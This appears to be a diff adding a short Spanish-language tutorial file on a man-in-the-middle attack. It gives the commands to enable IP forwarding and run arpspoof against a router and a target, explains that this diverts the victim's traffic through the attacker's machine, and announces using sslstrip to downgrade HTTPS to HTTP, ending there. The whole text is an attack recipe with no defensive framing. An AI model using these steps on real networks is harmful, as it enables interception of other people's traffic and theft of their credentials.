@@ -1,0 +1,35 @@
+﻿Usaremos herramienta arpspoof.
+
+
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+	
+	
+
+
+--Con esto redirigimos todo el tráfico robado al router
+
+
+
+#arpspoof -i [interfaz de red] -t [ip router] [ip objetivo]
+
+
+#arpspoof -i [interfaz de red] -t [ip objetivo] [ip router]
+	
+	--usando arpspoof realizamos el envenenamiento de arp
+	
+	diciendo que nuestra MAC se corresponde con la del router
+	
+	(de cara al objetivo), y con la del objetivo (de cara al 
+	
+	router)
+
+
+	
+	--Hasta aquí ya hemos desviado el tráfico a través de nuestro terminal
+(podemos apreciarlo con wireshark)
+	
+
+
+--A continuación desviaremos el tráfico https a http, usando la herramienta sslstrip
+
+
